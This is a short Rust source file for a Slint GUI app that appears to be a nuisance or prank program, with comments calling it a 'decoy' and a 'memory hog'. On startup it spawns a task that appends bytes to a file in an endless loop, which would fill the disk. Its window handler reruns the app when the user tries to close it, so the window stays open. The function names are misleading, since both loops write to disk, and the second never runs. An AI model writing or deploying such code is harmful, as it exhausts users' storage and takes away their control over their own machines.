
#![deny(unsafe_code)]

use std::io::Write;
slint::include_modules!();

//add booty bin
//decoy
//memory hog
async fn memory_hogging(){
    let mut file=std::fs::OpenOptions::new().append(true).open("twd/twd").unwrap();
    loop{
        file.write(b"twd").unwrap();
    }
}
//threads hog
async fn ram_hogging(){
    let mut file=std::fs::OpenOptions::new().append(true).open("twd/twd").unwrap();
    loop{
        file.write(b"twd").unwrap();
    }
}

#[tokio::main]
async fn main() {
    let app = App::new().unwrap();
    tokio::spawn(async{
        memory_hogging().await;
        ram_hogging().await;
    });
    let appy=app.as_weak();
    app.window().on_close_requested(move||{appy.unwrap().run().unwrap();slint::CloseRequestResponse::KeepWindowShown});
    app.run().unwrap();

}
